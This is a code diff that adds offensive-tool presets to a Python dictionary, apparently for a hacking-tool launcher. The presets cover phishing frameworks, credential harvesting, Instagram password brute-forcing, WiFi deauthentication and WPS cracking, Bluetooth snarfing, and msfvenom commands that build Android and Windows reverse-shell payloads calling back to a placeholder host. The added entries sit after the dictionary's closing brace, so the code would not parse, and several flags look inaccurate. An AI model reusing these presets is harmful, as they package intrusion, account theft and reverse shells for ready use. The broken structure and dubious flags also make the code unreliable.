@@ -243,3 +243,232 @@ BUILTIN_ARGS = {
         ("--regular target.com", "Regular scan"), ("--json_out out.json", "JSON")
     ],
 }
+    # === SOCIAL MEDIA & PHISHING TOOLS ===
+    "setoolkit": [
+        ("-s", "Social engineering attacks"), ("-p", "Phishing attack vectors"),
+        ("-w", "Website attack vectors"), ("-q", "Quick track"),
+        ("-m", "Mass mailer"), ("-c", "Credential harvester"),
+        ("-t", "Tabnabbing"), ("-j", "Java applet attack")
+    ],
+    "socialfish": [
+        ("-u", "Update"), ("-c", "Check credentials"), ("-r", "Run server"),
+        ("-p 8080", "Port 8080"), ("--ssl", "Enable SSL")
+    ],
+    "zphisher": [
+        ("-p", "Pick page"), ("-t", "Tunnel option"), ("-o", "Open port"),
+        ("-l", "Localhost"), ("--ngrok", "Ngrok tunnel")
+    ],
+    "blackeye": [
+        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server")
+    ],
+    "sherlock": [
+        ("username", "Search username"), ("-o output/", "Output folder"),
+        ("--csv", "CSV output"), ("--xlsx", "XLSX output"),
+        ("--site twitter", "Twitter only"), ("--site instagram", "Instagram only"),
+        ("--site facebook", "Facebook only"), ("--site all", "All sites"),
+        ("-t 10", "10 threads"), ("--timeout 5", "5s timeout")
+    ],
+    "holehe": [
+        ("email@example.com", "Check email"), ("-o output.csv", "CSV output"),
+        ("--only-used", "Only used"), ("-p", "Print results")
+    ],
+    "instashell": [
+        ("-u username", "Target user"), ("-p password", "Password"),
+        ("-f list.txt", "Password list"), ("-t 10", "10 threads")
+    ],
+    "instaloader": [
+        ("username", "Download profile"), ("--login YOUR_USER", "Login"),
+        ("--stories", "Download stories"), ("--highlights", "Download highlights"),
+        ("--tagged", "Tagged posts"), ("--igtv", "IGTV videos")
+    ],
+    "twint": [
+        ("-u username", "User tweets"), ("-s search_term", "Search"),
+        ("--since 2020-01-01", "Since date"), ("--csv", "CSV output"),
+        ("-o output.json", "JSON output")
+    ],
+    "tweepy": [
+        ("-u username", "User info"), ("-f followers", "Get followers"),
+        ("-t timeline", "User timeline"), ("-s search", "Search tweets")
+    ],
+    "facebook-scraper": [
+        ("-u profile_url", "Profile URL"), ("-p page_url", "Page URL"),
+        ("-g group_url", "Group URL"), ("--posts 20", "20 posts"),
+        ("--comments", "Get comments"), ("--likes", "Get likes")
+    ],
+    "tiktok-scraper": [
+        ("-u username", "User"), ("-t hashtag", "Hashtag"),
+        ("-n 50", "50 videos"), ("--download", "Download videos")
+    ],
+    "puppeteer": [
+        ("-u URL", "Target URL"), ("-s screenshot.png", "Screenshot"),
+        ("-p proxy:8080", "Proxy"), ("--headless", "Headless mode")
+    ],
+    
+    # === PHISHING FRAMEWORKS ===
+    "gophish": [
+        ("--port 3333", "Admin port"), ("--config config.json", "Config file"),
+        ("-v", "Verbose")
+    ],
+    "king-phisher": [
+        ("--server", "Start server"), ("--config config.yml", "Config"),
+        ("--debug", "Debug mode")
+    ],
+    "phishing-frenzy": [
+        ("-s", "Start server"), ("-p 3000", "Port 3000"),
+        ("-e production", "Environment")
+    ],
+    "evilginx2": [
+        ("-p phishlet", "Phishlet name"), ("-t target.com", "Target"),
+        ("-g group", "Phishlet group"), ("--debug", "Debug")
+    ],
+    "modlishka": [
+        ("-config config.json", "Config"), ("-proxy target.com", "Proxy target"),
+        ("-listeningAddress 0.0.0.0", "Listen"), ("-port 443", "Port")
+    ],
+    "muraena": [
+        ("-config config.toml", "Config"), ("-phish phish.toml", "Phish config"),
+        ("-t target.com", "Target domain"), ("-v", "Verbose")
+    ],
+    
+    # === CREDENTIAL HARVESTING ===
+    "credmap": [
+        ("-u target.com", "Target URL"), ("-f login_form", "Login form"),
+        ("-o output.txt", "Output"), ("-t 10", "Threads")
+    ],
+    "creds.py": [
+        ("-u URL", "Target URL"), ("-p payload.txt", "Payload list"),
+        ("-o output.txt", "Output file"), ("--proxy 127.0.0.1:8080", "Proxy")
+    ],
+    "pwned": [
+        ("-e email@test.com", "Check email"), ("-d domain.com", "Check domain"),
+        ("-o output.json", "JSON output")
+    ],
+    
+    # === OSINT / RECON ===
+    "theHarvester": [
+        ("-d domain.com -b google", "Google search"), ("-d domain.com -b all", "All sources"),
+        ("-d domain.com -b linkedin", "LinkedIn"), ("-f output.html", "HTML output"),
+        ("-c", "DNS brute"), ("-n", "DNS lookup")
+    ],
+    "recon-ng": [
+        ("-m module_name", "Module"), ("-w workspace", "Workspace"),
+        ("--no-version", "No version check"), ("--verbose", "Verbose")
+    ],
+    "spiderfoot": [
+        ("-s target.com", "Target"), ("-l 127.0.0.1:5001", "Web interface"),
+        ("-m all", "All modules"), ("-t passive", "Passive only")
+    ],
+    "osrframework": [
+        ("-u username", "Username search"), ("-e email@test.com", "Email search"),
+        ("-p phone_number", "Phone lookup"), ("-d domain.com", "Domain search")
+    ],
+    "maltego": [
+        ("-g graph.mtz", "Open graph"), ("-i import.csv", "Import data"),
+        ("-t transform", "Run transform")
+    ],
+    
+    # === WIFI HACKING ===
+    "bettercap": [
+        ("-iface wlan0", "Interface"), ("-caplet http-ui", "Web UI"),
+        ("-eval 'net.probe on'", "Network probe"), ("-eval 'wifi.recon on'", "WiFi recon"),
+        ("-eval 'wifi.deauth *'", "Deauth attack"), ("-eval 'net.sniff on'", "Packet sniff")
+    ],
+    "wireshark": [
+        ("-i wlan0", "Interface"), ("-k", "Start capture"), ("-r capture.pcap", "Read file"),
+        ("-Y 'http'", "Filter HTTP"), ("-Y 'dns'", "Filter DNS")
+    ],
+    "kismet": [
+        ("-c wlan0", "Interface"), ("--no-server", "No web server"),
+        ("--daemonize", "Background mode")
+    ],
+    "fluxion": [
+        ("-i wlan0", "Interface"), ("-e 'WiFi Name'", "Target ESSID"),
+        ("-c 6", "Channel 6"), ("-a", "Auto mode")
+    ],
+    "wifite": [
+        ("-i wlan0", "Interface"), ("--wpa", "WPA only"), ("--wep", "WEP only"),
+        ("--kill", "Kill processes"), ("--dict wordlist.txt", "Wordlist")
+    ],
+    "pixiewps": [
+        ("-e pke -s ehash1 -z ehash2 -a authkey -n ehash2", "Crack WPS"),
+        ("-f", "Force"), ("-v 3", "Verbose")
+    ],
+    "reaver": [
+        ("-i wlan0 -b BSSID", "Target"), ("-vv", "Very verbose"),
+        ("-c 6", "Channel"), ("-N", "No nacks"), ("-d 2", "Delay")
+    ],
+    
+    # === WEB EXPLOITATION ===
+    "burpsuite": [
+        ("--project=project.burp", "Open project"), ("--config=config.json", "Config"),
+        ("--collaborator-server", "Start collaborator"), ("--unpause-spidering", "Spider")
+    ],
+    "zap": [
+        ("-cmd", "Command line"), ("-daemon", "Daemon mode"),
+        ("-port 8080", "Port"), ("-config api.key=KEY", "API key")
+    ],
+    "commix": [
+        ("-u URL", "Target URL"), ("--data 'cmd=id'", "POST data"),
+        ("--os=unix", "Unix target"), ("--os=windows", "Windows target"),
+        ("--technique=t", "Time-based"), ("--technique=e", "Error-based")
+    ],
+    "xsser": [
+        ("-u URL", "Target URL"), ("--auto", "Auto mode"), ("--Fp", "Final payload"),
+        ("--Fr", "Final remote"), ("--D", "Delay"), ("--threads 5", "5 threads"),
+        ("-p 'param1,param2'", "Parameters"), ("--Coo='cookie'", "Cookie")
+    ],
+    "xsstrike": [
+        ("-u URL", "Target URL"), ("--data 'param=value'", "POST data"),
+        ("--fuzzer", "Fuzzer mode"), ("--crawl", "Crawl site"), ("--blind", "Blind XSS"),
+        ("-t 10", "10 threads"), ("--json", "JSON output")
+    ],
+    "nosqlmap": [
+        ("-u URL", "Target URL"), ("--mongodb", "MongoDB"), ("--couchdb", "CouchDB"),
+        ("--dump", "Dump data"), ("--enum-databases", "Enum databases")
+    ],
+    
+    # === ANDROID HACKING ===
+    "msfvenom": [
+        ("-p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk", "Android payload"),
+        ("-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe", "Windows payload"),
+        ("-l payloads", "List payloads"), ("--list formats", "List formats")
+    ],
+    "apktool": [
+        ("d app.apk", "Decompile"), ("b app/", "Build"), ("-f", "Force"),
+        ("-o output.apk", "Output file")
+    ],
+    "jadx": [
+        ("app.apk", "Decompile"), ("-d output/", "Output dir"), ("--deobf", "Deobfuscate")
+    ],
+    "dex2jar": [
+        ("classes.dex", "Convert DEX"), ("-o output.jar", "Output JAR")
+    ],
+    "androguard": [
+        ("analyze app.apk", "Analyze"), ("-o output/", "Output"), ("-v", "Verbose")
+    ],
+    
+    # === BLUETOOTH HACKING ===
+    "bluetoothctl": [
+        ("scan on", "Scan devices"), ("pair MAC", "Pair device"),
+        ("connect MAC", "Connect"), ("info MAC", "Device info")
+    ],
+    "hcitool": [
+        ("scan", "Scan devices"), ("info MAC", "Device info"),
+        ("name MAC", "Device name"), ("inq", "Inquiry")
+    ],
+    "blueranger": [
+        ("-i hci0", "Interface"), ("-t MAC", "Target"), ("-r", "Range test")
+    ],
+    "bluesnarfer": [
+        ("-b MAC", "Target"), ("-C 6", "Channel"), ("-i hci0", "Interface")
+    ],
+    
+    # === VOIP HACKING ===
+    "sipvicious": [
+        ("-p 5060 target.com", "SIP scan"), ("-e 100-200 target.com", "Extension scan"),
+        ("-m invite target.com", "Method scan")
+    ],
+    "voiphopper": [
+        ("-i eth0", "Interface"), ("-c 1", "VLAN 1"), ("-m", "MAC spoof")
+    ],
+}
